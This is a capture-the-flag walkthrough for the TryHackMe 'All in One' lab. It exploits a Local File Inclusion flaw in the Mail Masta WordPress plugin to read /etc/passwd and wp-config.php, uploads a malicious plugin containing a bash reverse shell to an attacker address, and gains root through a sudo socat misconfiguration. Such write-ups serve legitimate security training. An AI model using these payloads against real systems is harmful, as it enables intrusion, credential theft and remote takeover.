>In this walkthrough, we compromise the TryHackMe **All in One** machine by enumerating an exposed **WordPress** instance, identifying a vulnerable **Mail Masta 1.0** plugin, exploiting **Local File Inclusion (LFI)** to extract sensitive configuration files, reusing recovered credentials for **administrator access**, achieving **remote code execution** through a malicious plugin upload, pivoting to **SSH access** as `elyana`, and finally escalating privileges to **root** using a **GTFOBins socat sudo misconfiguration**.

First, add the target machine to your hosts file:

```plaintext
10.113.142.64 aio.thm
```

## Exploiting Mail Masta LFI

A verified PoC exists:

![](mail_masta_exploit_LFI_PoC.webp){: width="800" height="400" .shadow }

```text
http://server/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
```

Adapting it for the target:

```text
http://aio.thm/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
```

![](mail_masta_LFI_PoC_test_on_target.webp){: width="800" height="400" .shadow }

The LFI works successfully.

For stable output formatting, use PHP filters with base64 encoding:

```text
http://aio.thm/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=php://filter/convert.base64-encode/resource=/etc/passwd
```

Now target sensitive files like `wp-config.php`:

```text
http://aio.thm/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=php://filter/convert.base64-encode/resource=../../../../../wp-config.php
```

![](wpconfig_decoded_and_reading_creds.webp){: width="800" height="400" .shadow }

After decoding the response, database credentials are recovered.

## Remote Code Execution via Malicious Plugin

Create a malicious WordPress plugin containing a reverse shell:

```php
<?php
/**
 * Plugin Name: Wordpress Maint Shell
 * Author: Wordpress
 */

exec("/bin/bash -c 'bash -i >& /dev/tcp/<YOUR_IP>/<YOUR_PORT> 0>&1'");
?>
```

Archive it:

```shell
zip archive.zip reverse_shell.php
```

## Privilege Escalation

Check sudo privileges:

```shell
sudo -l
```
{: .nolineno }

```text
(ALL) NOPASSWD: /usr/bin/socat
```

Since `socat` is allowed via sudo, this is a straightforward GTFOBins privilege escalation vector.

![](gtfobins_socat.webp){: width="800" height="400" .shadow }

Exploit it with:

```shell
sudo socat - exec:/bin/sh,pty,ctty,raw,echo=0
```
{: .nolineno }

```text
# id
uid=0(root) gid=0(root) groups=0(root)
```

![](privesc_using_socat_get_root_shell_reading_encoded_root_flag.webp){: width="800" height="400" .shadow }

Now read the root flag:

```shell
cat /root/root.txt
```
{: .nolineno }

The root flag is also base64 encoded.

![](decoding_root_txt_with_base64.webp){: width="800" height="400" .shadow }

After decoding, the machine is fully compromised.
